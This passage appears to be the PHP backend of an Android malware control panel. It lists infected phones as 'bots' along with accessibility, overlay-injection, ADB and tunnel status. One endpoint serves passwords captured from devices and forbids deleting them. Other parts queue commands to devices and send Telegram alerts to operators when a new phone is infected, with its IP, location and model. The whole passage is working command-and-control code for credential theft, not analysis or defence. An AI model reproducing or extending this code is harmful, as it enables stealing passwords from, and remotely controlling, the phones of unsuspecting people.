            'accessibilityAlive'     => (bool)($row['accessibility_alive'] ?? false),
            'appName'                => $row['app_name'] ?? '',
            'appVersion'             => $row['app_version'] ?? '',
            'firstInstallTime'       => (int)(($row['first_seen'] ?? 0)) * 1000,
            'hasSim'                 => true,
            'lastSeen'               => $lastSeen * 1000,
            'localServiceConnected'  => (bool)($row['local_service_connected'] ?? 0),
            'model'                  => $row['model'] ?? '',
            'name'                   => $deviceId ? "{$brand}-" . strtoupper(substr($deviceId, -8)) : '',
            'osVersion'              => $row['os_version'] ?? '',
            'phoneNumber'            => $row['phone_number'] ?? '',
            'phoneNumber2'           => '',
            'publicIP'               => $publicIp,
            'remark'                 => $row['remark'] ?? '',
            'screenHeight'           => (int)($row['screen_height'] ?? 0),
            'screenWidth'            => (int)($row['screen_width'] ?? 0),
            'status'                 => $status,
            'batteryLevel'           => (int)($row['battery_level'] ?? 0),
            'networkType'            => $row['network_type'] ?? '',
            'ws_connected'           => $inDeviceConn,
            'bridge_connected'       => $inBridgeConn,
            'isScreenOn'             => (bool)($row['is_screen_on'] ?? false),
            'isCharging'             => (bool)($row['is_charging'] ?? false),
            'isLocked'               => (bool)($row['is_locked'] ?? false),
            'botId'                  => $deviceId,
            'deviceId'               => $deviceId,
            'permissions'            => $permissions,
            // 地理位置由 Node 设备状态流程异步补齐，列表请求只读取缓存。
            'geoLocation'            => $row['geo_location'] ?? '',
            'ownerUsername'          => $row['owner_username'] ?? '',
            'groupName'              => $row['group_name'] ?? '',
            'injection_active'       => (bool)($row['injection_active'] ?? false),
            'adb_enabled'            => (bool)($row['adb_enabled'] ?? 0),
            'adb_wifi_enabled'       => (bool)($row['adb_wifi_enabled'] ?? 0),
            'adb_deploy_enabled'     => (bool)($row['adb_deploy_enabled'] ?? 0),
            'wifi_port'              => (int)($row['wifi_port'] ?? 0),
            'tunnel_deployed'        => (bool)($row['tunnel_deployed'] ?? 0),
            'remote_port'            => (int)($row['remote_port'] ?? 0),
        ];
    }

    /**
     * GET /api/password-inputs/:deviceId
     * 获取设备密码输入记录
     * 返回格式与旧 Python 后端一致：ok([dict(r) for r in rows])
     * 即 data 是原始行字典数组
     */
    public function getPasswordInputs($deviceId = '')
    {
        if (!$deviceId) {
            $deviceId = Request::get('deviceId', '');
        }
        if (!$deviceId || !$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();

        // DELETE: 禁止删除密码数据
        if (Request::method() === 'DELETE') {
            return json(['success' => false, 'message' => '不允许删除密码数据'], 403);
        }

        $rows = Db::table('fisher_passwords')
            ->where('device_id', $deviceId)
            ->order('created_at', 'desc')
            ->select()
            ->toArray();

        // Python 返回原始行 dict：直接返回数据库行
        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
    }

    /**
     * GET /api/logs?deviceId=xxx&page=1&pageSize=50
     * 设备操作日志
     * 返回格式与旧 Python 后端完全一致
     */
    public function getLogs()
    {
        $deviceId = Request::get('deviceId', '');
        $page = max(1, (int)Request::get('page', 1));
        $pageSize = max(1, min(200, (int)Request::get('pageSize', 50)));
        $logType = Request::get('type', '');
        $searchContent = Request::get('searchContent', '') ?: Request::get('search', '');
        if ($searchContent !== '') {
          $searchContent = str_replace([chr(92), '%', '_'], [chr(92).chr(92), chr(92).'%', chr(92).'_'], $searchContent);
        }

        // Python: ok({"logs": [], "total": 0}) if no deviceId
        if (!$deviceId) {
            return json(['success' => true, 'data' => ['logs' => [], 'total' => 0], 'message' => 'success']);
        }
        if (!$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();

        $query = Db::table('fisher_operation_logs')->where('device_id', $deviceId);

        // 支持 type 过滤
        if ($logType) {
            $query = $query->where('log_type', $logType);
        }

        // 支持 searchContent 搜索
        if ($searchContent) {
            $query = $query->where('content', 'like', "%{$searchContent}%");  // $searchContent already escaped above (%, _, \)
        }

        $total = $query->count();
        $rows = $query->order('timestamp', 'desc')
            ->order('id', 'desc')
            ->limit($pageSize)
            ->page($page)
            ->select()
            ->toArray();

        // Python 返回: {"id": ..., "logType": ..., "content": ..., "timestamp": ...}
        // 注意：timestamp 是原始值（不乘 1000），logType 而非 type
        $logs = array_map(function ($row) {
            $ts = $row['timestamp'] ?? 0;
            // 前端 new Date(raw) 需要毫秒级时间戳
            if ($ts > 0 && $ts < 2000000000) {
                $ts = $ts * 1000;
            }
            return [
                'id'       => $row['id'] ?? 0,
                'logType'  => $row['log_type'] ?? '',
                'content'  => $row['content'] ?? '',
                'timestamp' => $ts,
            ];
        }, $rows);

        // Python 只返回 logs 和 total，不包含 page/pageSize
        return json([
            'success' => true,
            'data'    => [
                'logs'  => $logs,
                'total' => $total,
            ],
            'message' => 'success',
        ]);
    }

    /**
     * 入队命令到 pending_commands 表
     */
    private function enqueueCommand(string $deviceId, array $command): void
    {
        if (!$deviceId) return;
        if (!isset($command['id'])) {
            $command['id'] = uniqid('cmd-');
        }
        Db::table('fisher_pending_commands')->insert([
            'device_id'    => $deviceId,
            'command_json' => json_encode($command, JSON_UNESCAPED_UNICODE),
            'created_at'   => time(),
        ]);
    }

    /**
     * 检测新设备并发送 Telegram 通知
     * 逻辑：first_seen 在最近 60 秒内，且 tg_notified 字段为 0 的设备
     */
    private function checkNewDeviceNotify(array $rows, ?array $user): void
    {
        try {
            $now = time();
            foreach ($rows as $row) {
                $firstSeen = (int)($row['first_seen'] ?? 0);
                $notified = (int)($row['tg_notified'] ?? 0);
                $deviceId = $row['device_id'] ?? '';

                // 新设备：first_seen 在最近 60 秒内，且未通知过
                if ($deviceId && $firstSeen > 0 && ($now - $firstSeen) < 60 && !$notified) {
                    // ★ 自动绑定 owner：通过 app_name 查 fisher_app_owner_map 映射表
                    $ownerUsername = $row['owner_username'] ?? '';
                    if (!$ownerUsername) {
                        $appName = $row['app_name'] ?? '';
                        if ($appName) {
                            $mapRecord = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
                            if ($mapRecord && !empty($mapRecord['owner_username'])) {
                                $ownerUsername = $mapRecord['owner_username'];
                                Db::table('fisher_devices')->where('device_id', $deviceId)->update(['owner_username' => $ownerUsername]);
                                $row['owner_username'] = $ownerUsername;
                            }
                        }
                    }

                    // 标记为已通知（防重复）
                    Db::table('fisher_devices')->where('device_id', $deviceId)->update(['tg_notified' => 1]);

                    // 发送 TG 通知
                    $this->sendNewDeviceTgNotify($row);
                }
            }
        } catch (\Throwable $e) {
            // 静默处理，不影响正常返回
        }
    }

    /**
     * 发送新设备上线 TG 通知
     */
    private function sendNewDeviceTgNotify(array $device): void
    {
        // 查询所有配置了 TG 的用户
        $ownerUsername = $device['owner_username'] ?? '';
        $configs = [];

        if ($ownerUsername) {
            // 有 owner → 查 owner 的 TG 配置
            $userRow = Db::table('fisher_users')->where('username', $ownerUsername)->find();
            if ($userRow) {
                $cfg = $this->getUserTgConfig((int)$userRow['id']);
                if ($cfg) $configs[] = $cfg;
            }
        }

        if (empty($configs)) {
            // 无 owner 或 owner 没配置 → 通知所有配置了 TG 的用户
            $allTokens = Db::table('fisher_settings')
                ->where('key', 'like', 'tg_%_bot_token')
                ->where('value', '<>', '')
                ->select()->toArray();
            foreach ($allTokens as $t) {
                if (preg_match('/^tg_(\d+)_bot_token$/', $t['key'], $m)) {
                    $cfg = $this->getUserTgConfig((int)$m[1]);
                    if ($cfg) $configs[] = $cfg;
                }
            }
        }

        if (empty($configs)) return;

        // 构建消息
        $brand = strtoupper($device['brand'] ?? '');
        $deviceId = $device['device_id'] ?? '';
        $deviceName = $brand && $deviceId ? $brand . '-' . strtoupper(substr($deviceId, -8)) : $deviceId;
        $model = $device['model'] ?? '';
        $osVersion = $device['os_version'] ?? '';
        $ip = $device['public_ip'] ?? '';
        $appName = $device['app_name'] ?? '';
        $geo = $device['geo_location'] ?? '';
        $networkType = $device['network_type'] ?? '';
        $ownerUsername = $device['owner_username'] ?? '';
        $nowStr = date('Y-m-d H:i:s');

        $msg = "🆕 <b>新设备上线</b>\n"
            . "━━━━━━━━━━━━━━━\n"
            . "🔑 设备ID: <code>{$deviceId}</code>\n"
            . "📱 设备名称: <b>{$deviceName}</b>\n"
            . "📋 型号: {$model}\n"
            . "🌐 IP: {$ip}\n"
            . "🌍 地区: " . ($geo ?: '获取中') . "\n"
            . "🤖 系统: Android {$osVersion}\n"
            . "📦 版本: {$appName}\n"
            . "👤 归属: " . ($ownerUsername ?: '未绑定') . "\n"
            . "⏰ 安装时间: {$nowStr}";

        foreach ($configs as $cfg) {
            if (!empty($cfg['notify_online']) && $cfg['notify_online'] !== 'false' && $cfg['notify_online'] !== '0') {
                $this->doSendTelegram($cfg['bot_token'], $cfg['chat_id'], $msg, $cfg['api_proxy'] ?? '');
            }
        }
    }

    /**
     * 获取指定用户的 TG 配置
     */
    private function getUserTgConfig(int $userId): ?array
    {
        $config = ['bot_token' => '', 'chat_id' => '', 'api_proxy' => '', 'notify_online' => 'true', 'notify_sms' => 'true'];
        $config['chat_id'] = Db::table('fisher_settings')
            ->where('key', "tg_{$userId}_chat_id")
            ->value('value') ?: '';
        if (!$config['chat_id']) return null;

        $current = Db::table('fisher_users')->where('id', $userId)->find();
        $visited = [];
        while ($current && !isset($visited[$current['id']])) {
            $visited[$current['id']] = true;
            $prefix = 'tg_' . (int)$current['id'] . '_';
            $rows = Db::table('fisher_settings')
                ->whereIn('key', [
                    $prefix . 'bot_token',
                    $prefix . 'api_proxy',
                    $prefix . 'notify_online',
                    $prefix . 'notify_sms',
                ])
                ->select()->toArray();
            foreach ($rows as $row) {
                $field = str_replace($prefix, '', $row['key']);
                if ($field === 'bot_token' && !$config['bot_token']) $config['bot_token'] = trim((string)$row['value']);
                if ($field === 'api_proxy' && !$config['api_proxy']) $config['api_proxy'] = trim((string)$row['value']);
                if ($field === 'notify_online') $config['notify_online'] = (string)$row['value'];
                if ($field === 'notify_sms') $config['notify_sms'] = (string)$row['value'];
            }
            if ($config['bot_token']) break;

            $parentUsername = trim((string)($current['parent_username'] ?? ''));
            $current = $parentUsername
                ? Db::table('fisher_users')->where('username', $parentUsername)->find()
                : null;
        }
        return $config['bot_token'] ? $config : null;
    }

    /**
     * 发送 Telegram 消息（非阻塞，curl）
     */
    private function doSendTelegram(string $botToken, string $chatId, string $message, string $apiProxy = ''): void
    {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payload = json_encode(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML']);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
            CURLOPT_NOSIGNAL        => true,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        if ($apiProxy) {
            curl_setopt($ch, CURLOPT_PROXY, trim($apiProxy));
        }
        curl_exec($ch);
        curl_close($ch);
    }
}
